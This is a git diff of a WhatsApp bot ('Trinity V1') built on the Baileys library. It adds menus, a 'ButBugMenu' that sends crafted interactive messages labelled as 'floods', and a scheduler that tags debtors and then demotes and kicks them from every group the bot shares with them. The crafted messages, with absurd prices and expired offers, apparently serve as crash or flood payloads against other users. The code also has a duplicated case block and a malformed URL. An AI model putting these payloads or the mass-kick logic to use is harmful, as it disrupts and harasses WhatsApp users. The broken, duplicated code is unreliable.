@@ -167,7 +167,195 @@ if (m.isGroup) {
     console.log('isAdmin:', isAdmin)
     console.log('isBotAdmin:', isBotAdmin)
 }
-        
+       // ========== SHUFFLE HELPER ==========
+const shuffle = (arr, seed) => {
+  const a = [...arr];
+  let s = seed;
+  for (let i = a.length - 1; i > 0; i--) {
+    s = (s * 9301 + 49297) % 233280;
+    const j = Math.floor((s / 233280) * (i + 1));
+    [a[i], a[j]] = [a[j], a[i]];
+  }
+  return a;
+};
+
+// ========== SECTIONS (reusable) ==========
+const mainSections = (seed) => shuffle([
+  {
+    title: "! SubMenu!",
+    highlight_label: "© AsepXyz OkeGas",
+    rows: [{ title: "! Bvg - Menu!", description: "Menu bvg", id: ".xbvgsg22" }]
+  },
+  {
+    title: "# ./Market.js",
+    highlight_label: "© AsepXyz OkeGas",
+    rows: [{ title: "! List Script", description: "Menampilkan List Harga Script", id: ".sc" }]
+  },
+  {
+    title: "! ./Contact Creator",
+    highlight_label: "© AsepXyz OkeGas",
+    rows: [{ title: "! Owner Contact", description: "Whatsapp Owner", id: ".owner" }]
+  },
+  {
+    title: "! Thanks - To All!",
+    highlight_label: "© AsepXyz OkeGas",
+    rows: [{ title: "! Thanks - To!", description: "Credits & Partner Script", id: ".tqto" }]
+  }
+], seed);
+
+// ========== CTA BUTTONS (reusable) ==========
+const ctaButtons = (selectTitle, sectionSeed) => ([
+  {
+    name: "cta_url",
+    buttonParamsJson: JSON.stringify({ icon: "REVIEW", display_text: "! Channels", url: "https://whatsapp.com/channel/0029VbAyjNu9mrGh7Djui02R" })
+  },
+  {
+    name: "cta_url",
+    buttonParamsJson: JSON.stringify({ icon: "PROMOTION", display_text: "! Telegram - AsepJir", url: "https://t.me/AsepXxnx" })
+  },
+  {
+    name: "cta_url",
+    buttonParamsJson: JSON.stringify({ icon: "REVIEW", display_text: "! Website Official!", url: "https://asepxyz12.github.io/bot-wa-db/hosting/AseppXyz%20-%20Developer.html" })
+  },
+  {
+    name: "single_select",
+    buttonParamsJson: JSON.stringify({ icon: "DOCUMENT", title: selectTitle, sections: mainSections(sectionSeed) })
+  }
+]);
+
+// ========== PRODUCT HEADER (reusable) ==========
+const makeProductHeader = (imageMessage) => ({
+  hasMediaAttachment: true,
+  productMessage: {
+    product: {
+      productImage: imageMessage,
+      productId: "35767262379539399",
+      title: "./ TrinityV1 Xtrash!",
+      description: "# ./AseppXyzOkeGas",
+      currencyCode: "IDR",
+      priceAmount1000: "999999999999000",
+      salePriceAmount1000: "500000000000000",
+      productImageCount: 1
+    },
+    businessOwnerJid: "0@s.whatsapp.net"
+  }
+});
+
+// ========== LIMITED OFFER (reusable) ==========
+const makeLimitedOffer = () => ({
+  limited_time_offer: {
+    text: "🪸⃟༑⃁͇⃰₮ɽł₦ł₮ɏ₭łⱡⱡɎøʉ🦠",
+    url: "https://t.me/AsepXxnx",
+    copy_code: "#AsepXyzOkeGas",
+    expiration_time: Date.now() - 1000
+  }
+});
+
+const tapTarget = (title) => ({
+  tap_target_configuration: {
+    enabled: true,
+    title,
+    description: "© ₮Ɽł₦ł₮Ɏ₭łⱠⱠɎØɄ",
+    canonical_url: "https://asepxyz12.github.io/bot-wa-db/hosting/AseppXyz%20-%20Developer.html",
+    domain: "Asep.Cik.web",
+    button_index: 0
+  }
+});
+
+const bottomSheet = (seed) => ({
+  bottom_sheet: {
+    in_thread_buttons_limit: 2,
+    divider_indices: shuffle([3, 4, 5, 1, 2], seed),
+    list_title: "! TrinityXTrash!",
+    icon: "REVIEW",
+    button_title: "! Menu - List!"
+  }
+});
+
+// ========== ButMenu ==========
+const ButMenu = async (teks) => {
+  let media = await prepareWAMessageMedia(
+    { image: { url: thumbRzM } },
+    { upload: Asepp.waUploadToServer }
+  );
+
+  return Asepp.relayMessage(m.chat, {
+    viewOnceMessage: {
+      message: {
+        interactiveMessage: proto.Message.InteractiveMessage.create({
+          header: makeProductHeader(media.imageMessage),
+          body: { text: " " },
+          footer: { text: teks },
+          contextInfo: {
+            mentionedJid: [m.sender],
+            isForwarded: true,
+            forwardingScore: 250930,
+            forwardedNewsletterMessageInfo: {
+              newsletterJid: "120363418538598013@newsletter",
+              newsletterName: "</> R?aZaModsExpose!",
+              serverId: 999
+            }
+          },
+          nativeFlowMessage: {
+            messageParamsJson: JSON.stringify({
+              ...makeLimitedOffer(),
+              bottom_sheet: {
+                in_thread_buttons_limit: 2,
+                divider_indices: shuffle([2, 3, 4, 5, 1], 4),
+                list_title: "! TrinityXTrash!",
+                icon: "REVIEW",
+                button_title: "! Menu - List"
+              }
+            }),
+            buttons: ctaButtons("# ./TrinityXTrash!", 22)
+          }
+        })
+      }
+    }
+  }, { quoted: fakeQ });
+};
+
+// ========== ButBugMenu ==========
+const ButBugMenu = async (teks, teks2) => {
+  let media = await prepareWAMessageMedia(
+    { image: { url: "https://raw.githubusercontent.com/AsepXyz12/bot-wa-db/main/uploads/1781090161801.jpeg" } },
+    { upload: Asepp.waUploadToServer }
+  );
+
+  const makeCard = (footerTeks, selectTitle, tapTitle, seed) => ({
+    header: makeProductHeader(media.imageMessage),
+    body: { text: "" },
+    footer: { text: footerTeks },
+    nativeFlowMessage: {
+      messageParamsJson: JSON.stringify({
+        ...makeLimitedOffer(),
+        ...tapTarget(tapTitle),
+        ...bottomSheet(seed)
+      }),
+      buttons: ctaButtons(selectTitle, seed)
+    }
+  });
+
+  const Rapiw = [
+    makeCard(teks,  "# ./TrinityXTrash", "Σ𝐗𝐹𝐋𝐎𝐎𝐃𝐒 𝐆𝐄𝐍𝟐𝟐", 13),
+    makeCard(teks2, "# ./TrashXe",       "Σ𝐗𝐹𝐋𝐎𝐎𝐃𝐒 𝐆𝐄𝐍𝟏𝟗", 18)
+  ];
+
+  await Asepp.relayMessage(m.chat, {
+    viewOnceMessage: {
+      message: {
+        interactiveMessage: proto.Message.InteractiveMessage.create({
+          header: { title: "_./Trinity X Trash!" },
+          body: { text: "# ./AseppXyzOkeGas" },
+          carouselMessage: {
+            cards: Rapiw.map(card => proto.Message.InteractiveMessage.create(card)),
+            messageVersion: 1
+          }
+        })
+      }
+    }
+  }, { quoted: m });
+};
 function isBotNumberRegistered(botNumber) {
     const botNum = botNumber.split("@")[0];
     if (!Array.isArray(registeredBotNumbers)) return false;
@@ -530,55 +718,54 @@ ${code}`
     await payreply(`❌ Error: ${e.message}`)
   }
 }
-// Reply Text
-// Reply Text
+// Reply Text - versi support WA biasa + WA Business
 const payreply = async (teks) => {
-  let mentionList = []
-  let regex = /@?(\d{8,15})/g
-  let match
+let mentionList = []
+let regex = /@?(\d{8,15})/g
+let match
 
-  while ((match = regex.exec(teks)) !== null) {
-    let number = match[1]
-    let jid = number + "@s.whatsapp.net"
-    mentionList.push(jid)
-  }
-  await Asepp.sendMessage(
-    m.chat,
-    {
-      text: teks,
-      contextInfo: {
-        mentionedJid: mentionList,
-        forwardingScore: 999999,
-        isForwarded: true,
-        forwardedNewsletterMessageInfo: {
-          newsletterJid: '120363418538598013@newsletter',
-          serverMessageId: 145,
-          newsletterName: '𝐈𝐤𝐢𝐀𝐬𝐞𝐩𝐋𝐨𝐡𝐉𝐢𝐫',
-        },
-        externalAdReply: {
-          showAdAttribution: false,
-          containsAutoReply: true,
-          title: 'Asepp',
-          body: 'trinity V1',
-          previewType: 'VIDEO',
-          thumbnailUrl: 'https://img2.pixhost.to/images/7798/724632857_zedzbca3km.jpg',
-          sourceUrl: 'https://whatsapp.com'
-        }
-      }
-    },
-    {
-      quoted: {
-        key: {
-          fromMe: false,
-          participant: '0@s.whatsapp.net',
-          remoteJid: 'status@broadcast'
-        },
-        message: {
-          conversation: '𝐓𝐫𝐢𝐧𝐢𝐭𝐲 𝐕𝟏'
-        }
-      }
-    }
-  )
+while ((match = regex.exec(teks)) !== null) {
+let number = match[1]
+let jid = number + "@s.whatsapp.net"
+mentionList.push(jid)
+}
+await Asepp.sendMessage(
+m.chat,
+{
+text: teks,
+contextInfo: {
+mentionedJid: mentionList,
+forwardingScore: 999999,
+isForwarded: true,
+forwardedNewsletterMessageInfo: {
+newsletterJid: '120363418538598013@newsletter',
+serverMessageId: 1,
+newsletterName: '𝐀𝐬𝐞𝐩𝐗𝐲𝐳 𝐎𝐤𝐞𝐆𝐚𝐬',
+},
+externalAdreply: {
+showAdAttribution: false,
+containsAutoreply: true,
+title: '𝐀𝐬𝐞𝐩𝐗𝐲𝐳𝐈𝐬𝐁𝐚𝐜𝐤',
+body: '𝐓𝐫𝐢𝐧𝐢𝐭𝐲𝐂𝐢𝐤',
+previewType: 'PHOTO',
+thumbnailUrl: 'https://img2.pixhost.to/images/7798/724632857_zedzbca3km.jpg',
+sourceUrl: 't.me/AsepXxnx'
+}
+}
+},
+{
+quoted: {
+key: {
+fromMe: false,
+participant: '0@s.whatsapp.net',
+remoteJid: 'status@broadcast'
+},
+message: {
+conversation: '𝐓𝐫𝐢𝐧𝐢𝐭𝐲'
+}
+}
+}
+)
 }
 function fixBreaks(content) {
   const lines = content.split(/\r?\n/)
@@ -638,60 +825,181 @@ function fixBreaks(content) {
     removed
   }
 }
-function messageBuilder(options = {}) {
-    const hasLocation = !!options.location
-    const hasButtons = options.buttons && options.buttons.length > 0
 
-    if (hasLocation && hasButtons) {
-        return {
-            location: {
-                degreesLatitude: options.location.lat,
-                degreesLongitude: options.location.lng,
-                name: options.location.name || "",
-                address: options.location.address || ""
-            },
-            caption: options.text || "",
-            footer: options.footer || "",
-            buttons: options.buttons.map(btn => ({
-                buttonId: btn.id,
-                buttonText: { displayText: btn.text },
-                type: 1
-            })),
-            headerType: 6,
-            contextInfo: {
-                mentionedJid: options.mentions || [],
-                forwardingScore: options.forwardingScore || 999,
-                isForwarded: options.isForwarded || true
-            }
+
+
+
+
+
+
+
+const dbFolder = "./database"
+const dbFile = "./database/utang.json"
+
+// Auto bikin folder + file isi []
+if (!fs.existsSync(dbFolder)) fs.mkdirSync(dbFolder, { recursive: true })
+if (!fs.existsSync(dbFile)) fs.writeFileSync(dbFile, "[]", "utf-8")
+
+// Load anti error - kalo kosong/corrupt auto reset ke []
+const loadUtang = () => {
+    try {
+        let raw = fs.readFileSync(dbFile, "utf-8").trim()
+        if (!raw) {
+            fs.writeFileSync(dbFile, "[]")
+            return []
         }
+        return JSON.parse(raw)
+    } catch (e) {
+        console.log("utang.json corrupt, auto reset ke []")
+        fs.writeFileSync(dbFile, "[]")
+        return []
+    }
+}
+
+const saveUtang = (data) => fs.writeFileSync(dbFile, JSON.stringify(data, null, 2))
+
+// Scheduler cek tiap 10 detik
+setInterval(async () => {
+    try {
+        let data = loadUtang()
+        let now = new Date()
+        let tanggalNow = now.toLocaleDateString('id-ID', {
+            timeZone: 'Asia/Jakarta',
+            day: '2-digit', month: '2-digit', year: 'numeric'
+        }).replace(/\//g, '-')
+
+        // 1. Tag yang jatuh tempo hari ini
+        let jatuhTempo = data.filter(v => v.tanggal === tanggalNow &&!v.notified)
+        for (let item of jatuhTempo) {
+            await Asepp.sendMessage(item.chat, {
+                text: `⏰ *JATUH TEMPO HARI INI*\n\n@${item.target.split("@")[0]}\nTanggal: ${item.tanggal}\n\nKetik.delutang ${item.id} kalo udah bayar. Kalo 10 menit ga bayar = AUTO KICK SEMUA GRUP TERMASUK ADMIN!`,
+                mentions: [item.target]
+            })
+            item.notified = true
+            item.waktuTag = now.getTime()
+            saveUtang(data)
+        }
+
+        // 2. Kick yang udah ditagih > 10 menit dan belum lunas
+        let telat = data.filter(v =>
+            v.notified &&
+          !v.lunas &&
+            v.waktuTag &&
+            now.getTime() - v.waktuTag >= 600000
+        )
+
+        for (let item of telat) {
+            let allGroups = await Asepp.groupFetchAllParticipating()
+            let kickCount = 0
+
+            for (let gid in allGroups) {
+                let group = allGroups[gid]
+                let participants = group.participants
+                let members = participants.map(p => p.id)
+                
+                // GAMANDANG BULU: ga cek admin, langsung kick selama bot + target ada di grup
+                if (members.includes(Asepp.user.id) && members.includes(item.target)) {
+                    try {
+                        // LOGIKA TAMBAHAN: Cek status admin, kalau target adalah admin maka DEMOTE dulu
+                        let targetUser = participants.find(p => p.id === item.target)
+                        if (targetUser && (targetUser.admin === 'admin' || targetUser.admin === 'superadmin')) {
+                            await Asepp.groupParticipantsUpdate(gid, [item.target], 'demote')
+                            await new Promise(r => setTimeout(r, 1500)) // Jeda sejenak setelah demote
+                        }
+
+                        // Lanjut proses kick bawaan
+                        await Asepp.groupParticipantsUpdate(gid, [item.target], 'remove')
+                        kickCount++
+                        await new Promise(r => setTimeout(r, 2000))
+                    } catch (e) {
+                        console.log(`Gagal kick di ${group.subject}:`, e.message)
+                    }
+                }
+            }
+
+            await Asepp.sendMessage(item.chat, {
+                text: `❌ *WAKTU HABIS 10 MENIT*\n\n@${item.target.split("@")[0]} gagal bayar utang.\nAuto kick dari ${kickCount} grup. Admin pun kena.`,
+                mentions: [item.target]
+            })
+
+            data = data.filter(v => v.id!== item.id)
+            saveUtang(data)
+        }
+    } catch (e) {
+        console.log('Scheduler error:', e)
+    }
+}, 10000)
+
+    function messageBuilder(options = {}) {
+    const hasButtons = Array.isArray(options.buttons) && options.buttons.length > 0;
+
+    if (hasButtons) {
+        return {
+            viewOnceMessage: {
+                message: {
+                    messageContextInfo: {
+                        deviceListMetadata: {},
+                        deviceListMetadataVersion: 2
+                    },
+                    interactiveMessage: {
+                        header: {
+                            title: options.title || "",
+                            hasMediaAttachment: !!options.videoMessage,
+                            ...(options.videoMessage ? { videoMessage: options.videoMessage } : {})
+                        },
+                        body: {
+                            text: options.text || ""
+                        },
+                        footer: {
+                            text: options.footer || ""
+                        },
+                        nativeFlowMessage: {
+                            messageParamsJson: JSON.stringify({
+                                buttons: options.buttons.map(btn => {
+                                    if (btn.name === "single_select") return { name: "single_select", buttonParamsJson: btn.buttonParamsJson };
+                                    if (btn.name === "cta_url") return { name: "cta_url", buttonParamsJson: btn.buttonParamsJson };
+                                    
+                                    // Default untuk quick_reply jika format custom tidak ditentukan
+                                    return {
+                                        name: "quick_reply",
+                                        buttonParamsJson: JSON.stringify({
+                                            display_text: btn.text,
+                                            id: btn.id
+                                        })
+                                    };
+                                })
+                            }),
+                            // Fallback array buttons utama untuk kompabilitas protobuf
+                            buttons: options.buttons.map(btn => {
+                                if (btn.name) return btn;
+                                return {
+                                    name: "quick_reply",
+                                    buttonParamsJson: JSON.stringify({
+                                        display_text: btn.text,
+                                        id: btn.id
+                                    })
+                                };
+                            })
+                        },
+                        contextInfo: {
+                            mentionedJid: options.mentions || [],
+                            forwardingScore: 999,
+                            isForwarded: true
+                        }
+                    }
+                }
+            }
+        };
     }
 
+    // Default jika hanya teks biasa tanpa tombol
     return {
         text: options.text || "",
-        footer: options.footer || "",
-        buttons: options.buttons || [],
-        headerType: options.headerType || 1,
-        mentions: options.mentions || [],
-        contextInfo: {
-            mentionedJid: options.mentions || [],
-            forwardingScore: options.forwardingScore || 999,
-            isForwarded: options.isForwarded || true,
-            externalAdReply: options.externalAdReply || {
-                title: options.title || "Simple Message Builder",
-                body: options.body || "Baileys WhatsApp Bot",
-                thumbnailUrl: options.thumbnailUrl || "https://raw.githubusercontent.com/AsepXyz12/bot-wa-db/main/uploads/1779093427056.jpeg",
-                sourceUrl: options.sourceUrl || "https://whatsapp.com/channel/0029VbAyjNu9mrGh7Djui02R",
-                mediaType: 1,
-                renderLargerThumbnail: true
-            }
-        },
-
-        ...(options.image && { image: fs.readFileSync(options.image) }),
-        ...(options.video && { video: fs.readFileSync(options.video) }),
-        ...(options.audio && { audio: fs.readFileSync(options.audio), mimetype: "audio/mp4", ptt: options.ptt || false }),
-        ...(options.document && { document: fs.readFileSync(options.document), mimetype: options.mimetype || "application/octet-stream", fileName: options.fileName || "file.bin" }),
-        ...(options.sticker && { sticker: fs.readFileSync(options.sticker) })
-    }
+        contextInfo: { 
+            mentionedJid: options.mentions || [], 
+            isForwarded: true 
+        }
+    };
 }
 
        async function replybug(teks, target) {
@@ -994,8 +1302,55 @@ Nomor bot ini tidak terdaftar dalam database trinity V1.
     // LANJUT HANDLER LU DI SINI
     // ==========================
 })
-        
+       // AUTO TRIGGER JJ TANPA PREFIX - TARUH PALING ATAS (SEBELUM CUT PREFIX / SWITCH COMMAND)
+const rawText = (
+    (m.msg && m.msg.selectedButtonId) || 
+    (m.listResponseMessage && m.listResponseMessage.singleSelectReply && m.listResponseMessage.singleSelectReply.selectedRowId) ||
+    m.text || 
+    m.body || 
+    (typeof budy !== 'undefined' ? budy : '') || 
+    ''
+).trim().toLowerCase();
 
+if (m.isGroup && rawText && !rawText.startsWith(prefix)) {
+    try {
+        const fs = require('fs')
+        const path = require('path')
+        const groupId = m.chat
+        const dbPath = path.join(process.cwd(), 'database/jj.json')
+
+        if (fs.existsSync(dbPath)) {
+            let db = JSON.parse(fs.readFileSync(dbPath))
+
+            // Paksa cek apakah teks mentah cocok dengan nama folder di grup ini
+            if (db[groupId] && db[groupId][rawText] && db[groupId][rawText].length > 0) {
+                const mediaList = db[groupId][rawText]
+                const GITHUB_OWNER = "AsepXyz12"
+                const GITHUB_REPO = "bot-wa-db"
+
+                await payreply(`⏳ Folder *${rawText}* ditemukan.\nAuto kirim ${mediaList.length} media...`)
+
+                for (const media of mediaList) {
+                    try {
+                        const rawUrl = `https://githubusercontent.com{GITHUB_OWNER}/${GITHUB_REPO}/main/jj/${groupId}/${rawText}/${media.file}`
+
+                        if (media.type === 'image') await Asepp.sendMessage(m.chat, { image: { url: rawUrl } }, { quoted: m })
+                        else if (media.type === 'video') await Asepp.sendMessage(m.chat, { video: { url: rawUrl } }, { quoted: m })
+                        else if (media.type === 'audio') await Asepp.sendMessage(m.chat, { audio: { url: rawUrl }, mimetype: media.mime }, { quoted: m })
+                        else await Asepp.sendMessage(m.chat, { document: { url: rawUrl }, mimetype: media.mime, fileName: media.file }, { quoted: m })
+
+                        await new Promise(r => setTimeout(r, 1500))
+                    } catch (err) {
+                        console.log("Gagal kirim media:", err)
+                    }
+                }
+                return // BLOCK COMMAND BAWAHNYA AGAR GAK MASUK KE CASE LAIN
+            }
+        }
+    } catch (e) {
+        console.log("AUTO JJ ERROR:", e)
+    }
+}
     Asepp.ev.on("messages.upsert", async ({ messages }) => {
 
   for (let m of messages) {
@@ -1691,6 +2046,1212 @@ Use features wisely and responsibly ⚠️
   }
 }
 break
+
+case "V1":
+case "x1": {
+  try {
+    const {
+      generateWAMessageFromContent,
+      proto,
+      prepareWAMessageMedia
+    } = require("@whiskeysockets/baileys")
+
+    const moment = require("moment-timezone")
+    const fs = require("fs")
+    const path = require("path")
+    const { exec } = require("child_process")
+    const os = require("os")
+
+    const waktu = moment().tz("Asia/Jakarta")
+    const Hari = waktu.format("dddd")
+    const Tanggal = waktu.format("DD MMMM YYYY")
+    const Jam = waktu.format("HH:mm:ss")
+
+    const hariIndo = {
+      Sunday: "Minggu",
+      Monday: "Senin",
+      Tuesday: "Selasa",
+      Wednesday: "Rabu",
+      Thursday: "Kamis",
+      Friday: "Jumat",
+      Saturday: "Sabtu"
+    }
+
+    const HariIndonesia = hariIndo[Hari]
+
+    const totalMem = os.totalmem()
+    const freeMem = os.freemem()
+    const usedMem = totalMem - freeMem
+
+    const formatBytes = (bytes) => {
+      if (bytes === 0) return "0 Bytes"
+
+      const k = 1024
+      const sizes = ["Bytes", "KB", "MB", "GB"]
+      const i = Math.floor(Math.log(bytes) / Math.log(k))
+
+      return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + " " + sizes[i]
+    }
+
+    const formattedUsedMem = formatBytes(usedMem)
+    const formattedTotalMem = formatBytes(totalMem)
+
+    await Asepp.sendMessage(m.chat, {
+      react: {
+        text: "👑",
+        key: m.key
+      }
+    })
+
+    let tsm = `𝗧𝗥𝗜𝗡𝗜𝗧𝗬 𝗩𝟭 𝗠𝗔𝗜𝗡 𝗠𝗘𝗡𝗨`
+
+    let all = `*Hallo.. ${pushname}* 👋
+Welcome to \`Trinity V1\` WhatsApp Assistant.  
+Use the bot wisely and enjoy all available features ✨
+
+▢ *./Information.js_*
+└────
+│ ├─ »» Bot Name ☇ *Trinity*
+│ ├─ »» Owner ☇ *All Partner Spesial*
+│ ├─ »» Developer ☇ *Asepp*
+│ ├─ »» Version ☇ *V1*
+│ ├─ »» Language ☇ *JavaScript*
+│ ├─ »» Bot Mode ☇ *${Asepp.public ? "Public" : "Self"}*
+│ ├─ »» Runtime ☇ *${runtime(process.uptime())}*
+│ ├─ »» Memory ☇ *${formattedUsedMem} / ${formattedTotalMem}*
+│ ├─ »» User ☇ *${pushname}*
+│ └────
+
+▢ *./DateTime.js_*
+└────
+│ ├─ »» Hari ☇ *${HariIndonesia}*
+│ ├─ »» Tanggal ☇ *${Tanggal}*
+│ ├─ »» Jam ☇ *${Jam} WIB*
+│ └────
+
+▢ *./SupportSystem.js_*
+└────
+│ ├─ »» Ditchi ☇ *Friends*
+│ ├─ »» Kelpin ☇ *Friends*
+│ ├─ »» Trinity User ☇ *Support*
+│ ├─ »» All Partner ☇ *Support*
+│ └────
+
+▢ *./OwnerSosmed.js_*
+└────
+│ ├─ »» TikTok ☇ *://tiktok.com*
+│ ├─ »» Telegram ☇ *t.me/AsepXxnx*
+│ └────`
+
+    // Menyiapkan biner video background untuk Carousel Card agar loop play permanen
+    const imgMedia = await prepareWAMessageMedia(
+      {
+        video: {
+          url: "https://raw.githubusercontent.com/AsepXyz12/bot-wa-db/main/uploads/1780594025507.mp4"
+        },
+        gifPlayback: true
+      },
+      {
+        upload: Asepp.waUploadToServer
+      }
+    )
+
+    let msg = await generateWAMessageFromContent(
+      m.chat,
+      {
+        viewOnceMessage: {
+          message: {
+            messageContextInfo: {
+              deviceListMetadata: {}, deviceListMetadataVersion: 2
+            },
+
+            interactiveMessage: proto.Message.InteractiveMessage.create({
+              contextInfo: {
+                mentionedJid: [m.sender],
+                forwardingScore: 999999,
+                isForwarded: true,
+                forwardedNewsletterMessageInfo: {
+                  newsletterJid: "120363418538598013@newsletter",
+                  newsletterName: "𝐈𝐤𝐢𝐀𝐬𝐞𝐩𝐋𝐨𝐡𝐉𝐢𝐫",
+                  serverMessageId: 145
+                }
+              },
+
+              body: proto.Message.InteractiveMessage.Body.create({
+                text: tsm
+              }),
+
+              carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
+                cards: [
+                  {
+                    header: proto.Message.InteractiveMessage.Header.create({
+                      title: "",
+                      gifPlayback: true,
+                      hasMediaAttachment: true,
+                      ...imgMedia
+                    }),
+
+                    footer: proto.Message.InteractiveMessage.Footer.create({
+                      text: all
+                    }),
+
+                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
+                      messageParamsJson: JSON.stringify({
+                        limited_time_offer: {
+                          text: "𝐓𝐫𝐢𝐧𝐢𝐭𝐲 𝐕𝟏",
+                          url: "https://t.me/AsepXxnx",
+                          copy_code: "𝐕𝟏",
+                          expiration_time: Date.now() + 86400000
+                        },
+                        bottom_sheet: {
+                          in_thread_buttons_limit: 0, // Mengunci angka 0 agar semua tombol rapi bersembunyi di dalam panel list
+                          list_title: "Trinity Main Menu",
+                          button_title: "© V1" // Nama tombol picu luar card asli bawaan kamu
+                        }
+                      }),
+                    
+                      // FIX TOTAL NAMA BUTTON: Dikembalikan murni sesuai nama menu asli bawaan kamu tanpa diubah
+                      buttons: [
+                        {
+                          name: "quick_reply",
+                          buttonParamsJson: JSON.stringify({
+                            icon: "PROMOTION",
+                            display_text: "All Menu",
+                            id: ".allmenu"
+                          })
+                        },
+                        {
+                          name: "quick_reply",
+                          buttonParamsJson: JSON.stringify({
+                            icon: "DOCUMENT",
+                            display_text: "Bug Menu",
+                            id: ".bugmenu"
+                          })
+                        },
+                        {
+                          name: "quick_reply",
+                          buttonParamsJson: JSON.stringify({
+                            icon: "REVIEW",
+                            display_text: "Owner Menu",
+                            id: ".ownermenu"
+                          })
+                        },
+                        {
+                          name: "quick_reply",
+                          buttonParamsJson: JSON.stringify({
+                            icon: "DEFAULT",
+                            display_text: "Fun Menu",
+                            id: ".funmenu"
+                          })
+                        },
+                        {
+                          name: "quick_reply",
+                          buttonParamsJson: JSON.stringify({
+                            icon: "PROMOTION",
+                            display_text: "Cpanel Menu",
+                            id: ".cpanelmenu"
+                          })
+                        },
+                        {
+                          name: "quick_reply",
+                          buttonParamsJson: JSON.stringify({
+                            icon: "DOCUMENT",
+                            display_text: "Nsfw Menu",
+                            id: ".nsfwmenu"
+                          })
+                        },
+                        {
+                          name: "quick_reply",
+                          buttonParamsJson: JSON.stringify({
+                            icon: "REVIEW",
+                            display_text: "Thanks To",
+                            id: ".tqto"
+                          })
+                        },
+                        {
+                          name: "quick_reply",
+                          buttonParamsJson: JSON.stringify({
+                            icon: "DEFAULT",
+                            display_text: "Script",
+                            id: ".script"
+                          })
+                        },
+                        {
+                          name: "quick_reply",
+                          buttonParamsJson: JSON.stringify({
+                            icon: "PROMOTION",
+                            display_text: "Developer",
+                            id: ".owner"
+                          })
+                        }
+                      ]
+                    })
+                  }
+                ]
+              })
+            })
+          }
+        }
+      },
+      { quoted: qkontak }
+    )
+
+    await Asepp.relayMessage(m.chat, msg.message, { messageId: msg.key.id })
+
+    const input = "./image/ngentotlu.mp3"
+    const output = path.join(
+      __dirname,
+      "./tmp_convert_" + Date.now() + ".ogg"
+    )
+
+    if (fs.existsSync(input)) {
+      try {
+        await new Promise((resolve, reject) => {
+          exec(
+            `ffmpeg -y -i "${input}" -vn -map_metadata -1 -ac 1 -ar 48000 -c:a libopus -b:a 64k "${output}"`,
+            (err) => {
+              return err ? reject(err) : resolve()
+            }
+          )
+        })
+
+        await Asepp.sendMessage(
+          m.chat,
+          {
+            audio: fs.readFileSync(output),
+            mimetype: "audio/ogg; codecs=opus",
+            ptt: true,
+            contextInfo: {
+              forwardingScore: 0,
+              isForwarded: false
+            }
+          },
+          {
+            quoted: qkontak
+          }
+        )
+
+      } finally {
+        if (fs.existsSync(output)) {
+          fs.unlinkSync(output)
+        }
+      }
+    }
+
+  } catch (err) {
+    console.log(err)
+    payreply(`${err}`)
+  }
+}
+break
+
+case "V1":
+case "x1": {
+  try {
+    const {
+      generateWAMessageFromContent,
+      proto,
+      prepareWAMessageMedia
+    } = require("@whiskeysockets/baileys")
+
+    const moment = require("moment-timezone")
+    const fs = require("fs")
+    const path = require("path")
+    const { exec } = require("child_process")
+    const os = require("os")
+
+    const waktu = moment().tz("Asia/Jakarta")
+    const Hari = waktu.format("dddd")
+    const Tanggal = waktu.format("DD MMMM YYYY")
+    const Jam = waktu.format("HH:mm:ss")
+
+    const hariIndo = {
+      Sunday: "Minggu",
+      Monday: "Senin",
+      Tuesday: "Selasa",
+      Wednesday: "Rabu",
+      Thursday: "Kamis",
+      Friday: "Jumat",
+      Saturday: "Sabtu"
+    }
+
+    const HariIndonesia = hariIndo[Hari]
+
+    const totalMem = os.totalmem()
+    const freeMem = os.freemem()
+    const usedMem = totalMem - freeMem
+
+    const formatBytes = (bytes) => {
+      if (bytes === 0) return "0 Bytes"
+
+      const k = 1024
+      const sizes = ["Bytes", "KB", "MB", "GB"]
+      const i = Math.floor(Math.log(bytes) / Math.log(k))
+
+      return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + " " + sizes[i]
+    }
+
+    const formattedUsedMem = formatBytes(usedMem)
+    const formattedTotalMem = formatBytes(totalMem)
+
+    await Asepp.sendMessage(m.chat, {
+      react: {
+        text: "👑",
+        key: m.key
+      }
+    })
+
+    let tsm = `𝗧𝗥𝗜𝗡𝗜𝗧𝗬 𝗩𝟭 𝗠𝗔𝗜𝗡 𝗠𝗘𝗡𝗨`
+
+    let all = `*Hallo.. ${pushname}* 👋
+Welcome to \`Trinity V1\` WhatsApp Assistant.  
+Use the bot wisely and enjoy all available features ✨
+
+▢ *./Information.js_*
+└────
+│ ├─ »» Bot Name ☇ *Trinity*
+│ ├─ »» Owner ☇ *All Partner Spesial*
+│ ├─ »» Developer ☇ *Asepp*
+│ ├─ »» Version ☇ *V1*
+│ ├─ »» Language ☇ *JavaScript*
+│ ├─ »» Bot Mode ☇ *${Asepp.public ? "Public" : "Self"}*
+│ ├─ »» Runtime ☇ *${runtime(process.uptime())}*
+│ ├─ »» Memory ☇ *${formattedUsedMem} / ${formattedTotalMem}*
+│ ├─ »» User ☇ *${pushname}*
+│ └────
+
+▢ *./DateTime.js_*
+└────
+│ ├─ »» Hari ☇ *${HariIndonesia}*
+│ ├─ »» Tanggal ☇ *${Tanggal}*
+│ ├─ »» Jam ☇ *${Jam} WIB*
+│ └────
+
+▢ *./SupportSystem.js_*
+└────
+│ ├─ »» Ditchi ☇ *Friends*
+│ ├─ »» Kelpin ☇ *Friends*
+│ ├─ »» Trinity User ☇ *Support*
+│ ├─ »» All Partner ☇ *Support*
+│ └────
+
+▢ *./OwnerSosmed.js_*
+└────
+│ ├─ »» TikTok ☇ *://tiktok.com*
+│ ├─ »» Telegram ☇ *t.me/AsepXxnx*
+│ └────`
+
+    // Menyiapkan biner video background untuk Carousel Card agar loop play permanen
+    const imgMedia = await prepareWAMessageMedia(
+      {
+        video: {
+          url: "https://githubusercontent.com"
+        },
+        gifPlayback: true
+      },
+      {
+        upload: Asepp.waUploadToServer
+      }
+    )
+
+    let msg = await generateWAMessageFromContent(
+      m.chat,
+      {
+        viewOnceMessage: {
+          message: {
+            messageContextInfo: {
+              deviceListMetadata: {}, deviceListMetadataVersion: 2
+            },
+
+            interactiveMessage: proto.Message.InteractiveMessage.create({
+              contextInfo: {
+                mentionedJid: [m.sender],
+                forwardingScore: 999999,
+                isForwarded: true,
+                forwardedNewsletterMessageInfo: {
+                  newsletterJid: "120363418538598013@newsletter",
